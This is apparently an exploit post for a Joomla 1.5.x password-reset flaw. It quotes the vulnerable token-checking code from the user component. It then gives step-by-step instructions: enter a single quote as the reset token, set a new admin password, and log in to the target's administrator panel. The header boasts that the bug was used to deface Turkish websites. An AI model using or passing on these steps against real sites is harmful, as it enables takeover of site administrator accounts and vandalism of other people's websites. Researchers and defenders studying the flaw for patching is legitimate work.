Joomla 1.5.x (Token) Remote Admin Change Password Vulnerability
===============================================================



#####################################################################################
####                     Joomla 1.5.x Remote Admin Password Change               ####
#####################################################################################
#                                                                                   #
# Greets: GregStar, gorion, d3d!k                                                   #
#                                                                                   #
# Polish "hackers" used this bug to deface turkish sites BUAHAHHA nice 0-day pff    #
#                                                                                   #
#####################################################################################



File : /components/com_user/controller.php

#####################################################################################
Line : 379-399
 
	function confirmreset()
	{
		// Check for request forgeries
		JRequest::checkToken() or die( &#039;Invalid Token&#039; );

		// Get the input
		$token = JRequest::getVar(&#039;token&#039;, null, &#039;post&#039;, &#039;alnum&#039;);              < --- {1} 
                  
		// Get the model
		$model = &$this->getModel(&#039;Reset&#039;);

		// Verify the token
		if ($model->confirmReset($token) === false)   < --- {2}
		{
			$message = JText::sprintf(&#039;PASSWORD_RESET_CONFIRMATION_FAILED&#039;, $model->getError());
			$this->setRedirect(&#039;index.php?option=com_user&view=reset&layout=confirm&#039;, $message);
			return false;
		}

		$this->setRedirect(&#039;index.php?option=com_user&view=reset&layout=complete&#039;);
	}
	
#####################################################################################
	
File : /components/com_user/models/reset.php

Line: 111-130 	
	
	
	
	function confirmReset($token)
	{
		global $mainframe;

		$db	= &JFactory::getDBO();
		$db->setQuery(&#039;SELECT id FROM #__users WHERE block = 0 AND activation = &#039;.$db->Quote($token));  < ---- {3} 

		// Verify the token
		if (!($id = $db->loadResult()))
		{
			$this->setError(JText::_(&#039;INVALID_TOKEN&#039;));
			return false;
		}

		// Push the token and user id into the session
		$mainframe->setUserState($this->_namespace.&#039;token&#039;,	$token);
		$mainframe->setUserState($this->_namespace.&#039;id&#039;,	$id);

		return true;
	}
#####################################################################################



{1} - Replace &#039; with empty char
{3} - If you enter &#039; in token field then query will be looks like : "SELECT id FROM jos_users WHERE block = 0 AND activation = &#039;&#039; "


Example :


1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm

2. Write into field "token" char &#039; and Click OK.

3. Write new password for admin

4. Go to url : target.com/administrator/

5. Login admin with new password




